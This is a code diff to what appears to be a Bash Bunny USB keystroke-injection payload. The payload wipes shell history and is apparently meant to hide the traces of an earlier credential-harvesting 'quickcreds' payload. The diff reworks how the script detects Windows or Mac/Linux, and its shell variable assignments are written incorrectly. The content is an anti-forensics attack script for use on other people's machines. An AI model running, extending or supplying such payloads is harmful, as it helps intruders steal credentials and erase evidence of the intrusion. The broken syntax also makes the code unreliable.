@@ -12,20 +12,20 @@
 # EXACT NUMBER OF LINES TO REMOVE FROM HISTORY (MAC / LINUX) - DEFAULT : ALL
 LINES = 0
 
+# PLATFORM CHECK
+# LOOTFILE CHECK - DEFAULT MAC / LINUX.
+#FOR WINDOWS, CREAT FILE '/root/udisk/loot/quickcreds/ghost_cleanup_win' IN YOUR FIRST PAYLOAD.
+
+if [ -f /root/udisk/loot/quickcreds/ghost_cleanup_win ]; then
+    PLATFORM_COMMAND = "cmd"
+else
+    PLATFORM_COMMAND = "terminal"
+fi
+
+#START
 LED R
 ATTACKMODE HID STORAGE
 
-# PLATFORM CHECK
-PLATFORM_COMMAND = ""
-if [ ! -f ~/.bash_history ]; then
-    #WINDOWS
-    $PLATFORM_COMMAND = "cmd"
-else
-    #MAC / LINUX
-    $PLATFORM_COMMAND = "terminal"
-fi
-
-# EMULATION
 QUACK DELAY 1000
 QUACK ALT F2
 QUACK DELAY 50
